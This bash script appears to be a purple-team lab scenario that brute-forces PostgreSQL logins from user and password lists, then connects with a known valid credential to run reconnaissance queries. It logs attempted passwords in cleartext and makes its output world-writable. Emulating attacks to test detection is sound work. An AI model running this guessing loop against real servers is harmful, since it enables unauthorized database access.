#!/usr/bin/env bash
set -euo pipefail

SCENARIO_DIR="/home/labuser/purple-lab/scenarios/S7"
ENV_FILE="${SCENARIO_DIR}/inputs/target.env"
USERS_FILE="${SCENARIO_DIR}/inputs/users.txt"
PASSWORDS_FILE="${SCENARIO_DIR}/inputs/passwords.txt"
OUTPUT_ROOT="${SCENARIO_DIR}/output"

LAB_OWNER="${LAB_OWNER:-labuser}"
LAB_GROUP="${LAB_GROUP:-labuser}"

source "${ENV_FILE}"

RUN_ID="$(date +%Y%m%d_%H%M%S)"
RUN_DIR="${OUTPUT_ROOT}/${RUN_ID}"
mkdir -p "${RUN_DIR}"

ATTEMPT_LOG="${RUN_DIR}/attempts.log"
SUMMARY_LOG="${RUN_DIR}/summary.log"
SUCCESS_LOG="${RUN_DIR}/success.log"

echo "[S7] start=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "[S7] target=${TARGET_HOST}:${TARGET_PORT}/${TARGET_DB}" | tee -a "${SUMMARY_LOG}"
echo "[S7] output_dir=${RUN_DIR}" | tee -a "${SUMMARY_LOG}"

attempt=0

while IFS= read -r username; do
  [ -z "${username}" ] && continue

  while IFS= read -r password; do
    [ -z "${password}" ] && continue

    attempt=$((attempt + 1))
    ts="$(date -Iseconds)"

    set +e
    PGPASSWORD="${password}" PGCONNECT_TIMEOUT=3 \
      psql \
      -h "${TARGET_HOST}" \
      -p "${TARGET_PORT}" \
      -U "${username}" \
      -d "${TARGET_DB}" \
      -c "select 1;" \
      > "${RUN_DIR}/failed_response_${attempt}.out" \
      2> "${RUN_DIR}/failed_response_${attempt}.err"
    rc=$?
    set -e

    printf '%s failed_attempt=%s username="%s" password="%s" rc=%s\n' \
      "${ts}" "${attempt}" "${username}" "${password}" "${rc}" \
      | tee -a "${ATTEMPT_LOG}"

    sleep "${SLEEP_SECONDS}"
  done < "${PASSWORDS_FILE}"
done < "${USERS_FILE}"

echo "[S7] attempting successful access..." | tee -a "${SUMMARY_LOG}"

PGPASSWORD="${VALID_PASSWORD}" \
psql \
  -h "${TARGET_HOST}" \
  -p "${TARGET_PORT}" \
  -U "${VALID_USER}" \
  -d "${TARGET_DB}" \
  -c "select current_user;" \
  > "${RUN_DIR}/success_query_1.out" \
  2> "${RUN_DIR}/success_query_1.err"

PGPASSWORD="${VALID_PASSWORD}" \
psql \
  -h "${TARGET_HOST}" \
  -p "${TARGET_PORT}" \
  -U "${VALID_USER}" \
  -d "${TARGET_DB}" \
  -c "select current_database();" \
  > "${RUN_DIR}/success_query_2.out" \
  2> "${RUN_DIR}/success_query_2.err"

PGPASSWORD="${VALID_PASSWORD}" \
psql \
  -h "${TARGET_HOST}" \
  -p "${TARGET_PORT}" \
  -U "${VALID_USER}" \
  -d "${TARGET_DB}" \
  -c "select version();" \
  > "${RUN_DIR}/success_query_3.out" \
  2> "${RUN_DIR}/success_query_3.err"

printf '%s successful_access user="%s" db="%s"\n' \
  "$(date -Iseconds)" "${VALID_USER}" "${TARGET_DB}" \
  | tee -a "${SUCCESS_LOG}"

echo "[S7] end=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "${RUN_DIR}" > "${OUTPUT_ROOT}/latest_run_path.txt"

chmod -R a+rwX "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
if id "${LAB_OWNER}" >/dev/null 2>&1; then
  chown -R "${LAB_OWNER}:${LAB_GROUP}" "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
fi
